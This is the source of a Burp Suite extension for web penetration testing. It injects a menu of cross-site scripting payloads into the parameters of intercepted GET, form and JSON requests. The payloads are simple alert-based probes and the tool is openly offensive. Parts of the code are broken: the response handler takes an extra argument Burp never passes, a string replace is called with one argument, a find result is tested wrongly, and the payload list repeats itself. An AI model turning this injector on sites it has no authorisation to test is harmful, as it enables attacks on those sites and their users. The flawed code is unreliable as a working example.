#!/usr/bin/env python
# coding:utf-8
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

import os
import re
import urllib

from burp import IBurpExtender
from burp import IHttpListener
from java.io import PrintWriter
from java.lang.String import getMethod
from burp import IContextMenuFactory
from javax.swing import JMenu
from javax.swing import JMenuItem
import hashlib
import urllib
import json

try:
  from exceptions_fix import FixBurpExceptions
except ImportError:
  pass


class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("XSS Filter Bypass")
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)

    def createMenuItems(self, invocation):
        self.menus = []
        self.mainMenu = JMenu("XSS Filter Bypass")
        self.menus.append(self.mainMenu)
        self.invocation = invocation

        menuItem = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1) />',
            '<svg onload=alert(\'XSS\')>',
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1) />',
            '<svg onload=alert(\'XSS\')>'
        ]
        for payload in menuItem:
            menu = JMenuItem(payload, None,
                             actionPerformed=lambda
                                 x: self.requestModify(
                                 x))
            self.mainMenu.add(menu)
        return self.menus if self.menus else None

    def requestModify(self, x):
        self.payload = x.getSource().text
        currentRequest = self.invocation.getSelectedMessages()[0]
        requestInfo = self._helpers.analyzeRequest(currentRequest)
        self.headers = list(requestInfo.getHeaders())
        if (requestInfo.getMethod() == "GET"):
            body = currentRequest.getRequest()  # return byte[]
            requestInfo = self._helpers.analyzeRequest(
                currentRequest)  # returns IResponseInfo
            paraList = requestInfo.getParameters()  # array
            # print 'paraList',paraList
            new_requestInfo = body
            white_action = ['action', 'sign']
            for para in paraList:
                if para.getType() == 0 and not self.Filter(white_action,
                                                           para.getName()):
                    value = para.getValue() + self.payload
                    key = para.getName()
                    newPara = self._helpers.buildParameter(key, value,
                                                           para.getType())
                    new_requestInfo = self._helpers.updateParameter(
                        new_requestInfo,
                        newPara)  # updateParameter(byte[],IParameter) return byte[]

            currentRequest.setRequest(new_requestInfo)

        elif (requestInfo.getMethod() == "POST"):
            bodyBytes = currentRequest.getRequest()[
                        requestInfo.getBodyOffset():]
            self.body = self._helpers.bytesToString(bodyBytes)
            # print 'self.body:',self.body
            o, n = self.update_body(urllib.unquote(self.body))
            self.body = self.body.replace(o, n)
            newMessage = self._helpers.buildHttpMessage(self.headers,
                                                        self.body)
            currentRequest.setRequest(newMessage)

    def Filter(self, white_action, key):
        return True if ([True for i in white_action if
                         i in key.lower()]) else False

    def update_body(self, body=""):
        try:
            o = body
            white_action = ['submit', 'token', 'code', 'id', 'password']
            for item in self.headers:
                if (item.startswith(
                        'Content-Type:') and 'application/json' in item) or body.startswith(
                        '{"'):
                    json_type = 1
                    break
                else:
                    json_type = 0
            if json_type == 0:
                params = o.split('&')
                for i in range(len(params)):
                    if self.Filter(white_action, params[i].split('=')[0]):
                        continue
                    params[i] = params[i] + self.payload
                n = '&'.join(params)
                return o, n
            if json_type == 1:
                data = json.loads(o)
                for item in data:
                    if self.Filter(white_action, item):
                        continue
                    data[item] = data[item] + self.payload
                n = json.dumps(data)
                return o, n
        except Exception as e:
            return e

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo, x):
        if toolFlag == 64 or toolFlag == 16 or toolFlag == 32:
            if not messageIsRequest:
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(
                    response)  # returns IResponseInfo
                headers = analyzedResponse.getHeaders()
                body = response[analyzedResponse.getBodyOffset():]
                body_string = body.tostring()
                text = body_string.find(x)
                if text:
                    new_body_string = body_string.replace('<!-- Your ' + x +
                        ' payload allowed -->')
                    new_body = self._helpers.bytesToString(new_body_string)
                    # print new_body_string
                    messageInfo.setResponse(
                        self._helpers.buildHttpMessage(headers, new_body)
                    )


try:
    FixBurpExceptions()
except:
    pass
